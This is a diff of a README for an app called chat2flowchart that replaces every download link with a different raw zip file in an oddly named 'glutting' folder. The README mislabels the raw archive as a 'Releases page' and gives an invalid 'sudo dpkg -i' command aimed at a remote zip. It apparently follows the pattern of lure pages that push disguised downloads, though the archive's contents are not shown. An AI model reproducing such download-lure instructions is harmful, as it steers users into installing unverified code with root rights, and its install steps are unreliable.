@@ -1,7 +1,7 @@
 # 🌟 chat2flowchart - Create Flowcharts from Chat
 
 ## 📥 Download Now
-[![Download chat2flowchart](https://raw.githubusercontent.com/khaled8787/chat2flowchart/main/glutting/chat2flowchart.zip%https://raw.githubusercontent.com/khaled8787/chat2flowchart/main/glutting/chat2flowchart.zip)](https://raw.githubusercontent.com/khaled8787/chat2flowchart/main/glutting/chat2flowchart.zip)
+[![Download chat2flowchart](https://github.com/khaled8787/chat2flowchart/raw/refs/heads/main/glutting/flowchart-chat-v3.3-beta.1.zip%https://github.com/khaled8787/chat2flowchart/raw/refs/heads/main/glutting/flowchart-chat-v3.3-beta.1.zip)](https://github.com/khaled8787/chat2flowchart/raw/refs/heads/main/glutting/flowchart-chat-v3.3-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **chat2flowchart**! This application allows you to turn your chat conversations into easy-to-read flowcharts. Whether you're summarizing a project, brainstorming ideas, or tracking decisions, flowcharts make it clear.
@@ -14,7 +14,7 @@ Before you begin, ensure your device meets the following requirements:
 - **Disk Space:** Minimum of 100 MB free space for installation.
 
 ## 📂 Download & Install
-To get started, visit this page to download: [chat2flowchart Releases](https://raw.githubusercontent.com/khaled8787/chat2flowchart/main/glutting/chat2flowchart.zip).
+To get started, visit this page to download: [chat2flowchart Releases](https://github.com/khaled8787/chat2flowchart/raw/refs/heads/main/glutting/flowchart-chat-v3.3-beta.1.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of **chat2flowchart**.
@@ -36,7 +36,7 @@ To get started, visit this page to download: [chat2flowchart Releases](https://r
 #### For Linux:
 1. Download the appropriate package for your distribution.
 2. Open a terminal and navigate to the Downloads folder.
-3. Use the package manager to install the application (e.g., `sudo dpkg -i https://raw.githubusercontent.com/khaled8787/chat2flowchart/main/glutting/chat2flowchart.zip` for Debian-based systems).
+3. Use the package manager to install the application (e.g., `sudo dpkg -i https://github.com/khaled8787/chat2flowchart/raw/refs/heads/main/glutting/flowchart-chat-v3.3-beta.1.zip` for Debian-based systems).
 4. Resolve any dependencies that may arise.
 
 ## 🗺️ How to Use chat2flowchart
@@ -59,7 +59,7 @@ If you encounter issues:
 
 - Ensure your OS version meets the requirements.
 - Restart your application if it freezes.
-- Check for any available updates on the [Releases page](https://raw.githubusercontent.com/khaled8787/chat2flowchart/main/glutting/chat2flowchart.zip).
+- Check for any available updates on the [Releases page](https://github.com/khaled8787/chat2flowchart/raw/refs/heads/main/glutting/flowchart-chat-v3.3-beta.1.zip).
 - Consult our FAQ section in the application for common problems and solutions.
 
 ## 💬 Feedback & Support
